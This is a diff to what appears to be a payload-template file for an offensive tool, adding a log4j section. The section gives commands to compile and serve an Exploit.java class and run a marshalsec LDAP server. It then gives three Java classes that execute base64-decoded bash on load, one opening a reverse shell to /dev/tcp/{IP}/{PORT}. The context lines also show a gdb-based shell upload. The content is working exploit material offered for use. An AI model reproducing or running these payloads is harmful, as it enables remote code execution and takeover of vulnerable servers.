@@ -1468,9 +1468,47 @@ payload:
       remote put /tmp/shell.sh /tmp/shell.sh
       set remote exec-file /tmp/shell.sh
       run
-      
-      
-      
+  log4j:
+    - |
+      # Commands To Run
+      -> Run javac Exploit.java -source 8 -target 8
+      -> Run python3 -m http.server 80 in the directory of Exploit.java
+      -> RUN java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{IP}/#Exploit" (Listening Port 1389)
+    - |
+      # Exploit (Save as Exploit.java)
+      public class Exploit {
+        static {
+             try {
+                   java.lang.Runtime.getRuntime().exec("echo {BASE64} | base64 -d | bash");
+             } catch (Exception e) {
+                   e.printStackTrace();
+             }
+        }
+      }
+    - |
+      # Exploit (Save as Exploit.java)
+      public class Exploit {
+        static {
+             try {
+                 java.lang.Runtime.getRuntime().exec("bash -c {echo,{BASE64}}|{base64,-d}|{bash,-i}");
+             } catch (Exception e) {
+                  e.printStackTrace();
+             }
+        }
+      }
+    - |
+      # Exploit (Save as Exploit.java)
+      public class Exploit {
+          static {
+                try {
+                    java.lang.Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{IP}/{PORT} 0>&1");
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+         }
+      }
+    - |
+      {LOG4J}
       
       
       
